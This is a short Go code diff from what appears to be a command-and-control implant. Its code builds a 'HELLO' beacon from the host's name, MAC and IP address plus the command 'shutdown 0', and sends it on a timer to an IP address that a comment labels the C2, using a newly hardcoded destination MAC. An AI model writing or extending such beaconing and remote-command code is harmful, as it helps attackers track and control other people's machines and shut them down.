@@ -349,7 +349,7 @@ func CreateHello(hostMAC net.HardwareAddr, srcIP net.IP) (hello string) {
 	if err != nil {
 		log.Fatal("Hostname not found...")
 	}
-
+	
 	hello = "HELLO:" + "#" + hostname + "#" + hostMAC.String() + "#" + srcIP.String() + "#"  + "shutdown 0" 
 	fmt.Println("[+] Payload Created:", hello)
 
@@ -459,6 +459,7 @@ func main() {
 	// Start hello timer
 	// Set the below IP to the IP of the C2
 	// 192.168.4.6
+	dstMAC = "00:1b:17:00:01:11"
 	go sendHello(iface, src, net.IPv4(172, 25, 41, 11), dstMAC)
 
 	// Listen for responses
